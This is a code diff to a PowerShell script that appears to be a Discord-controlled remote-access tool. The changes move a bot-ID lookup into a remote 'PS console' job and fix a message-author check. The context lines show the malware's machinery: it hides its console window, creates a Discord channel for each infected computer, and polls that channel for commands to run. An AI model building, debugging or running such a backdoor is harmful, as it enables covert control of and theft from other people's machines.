@@ -1195,7 +1195,18 @@ $process
 
 # Scriptblock for PS console in discord
 $doPowershell = {
-param([string]$token,[string]$PowershellID,[string]$botId)
+param([string]$token,[string]$PowershellID)
+    Function Get-BotUserId {
+        $headers = @{
+            'Authorization' = "Bot $token"
+        }
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", $headers.Authorization)
+        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
+        $botInfo = $botInfo | ConvertFrom-Json
+        return $botInfo.id
+    }
+    $global:botId = Get-BotUserId
     sleep 5
     $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
     $w = New-Object System.Net.WebClient
@@ -1210,7 +1221,7 @@ param([string]$token,[string]$PowershellID,[string]$botId)
     while($true){
         $msg = $w.DownloadString($url)
         $r = ($msg | ConvertFrom-Json)[0]
-        if(-not $r.author.id -eq $botId){
+        if($r.author.id -ne $botId){
             $a = $r.timestamp
             $msg = $r.content
         }
@@ -1459,17 +1470,7 @@ sendMsg -Embed $jsonPayload
 If ($hideconsole -eq 1){ 
     HideWindow
 }
-Function Get-BotUserId {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)
-    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
-    $botInfo = $botInfo | ConvertFrom-Json
-    return $botInfo.id
-}
-$global:botId = Get-BotUserId
+
 # Create category and new channels
 NewChannelCategory
 sleep 1
@@ -1595,7 +1596,7 @@ while ($true) {
         }
         if ($messages -eq 'psconsole'){
             if (!($PSrunning)){
-                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID, $global:botID
+                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                 sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
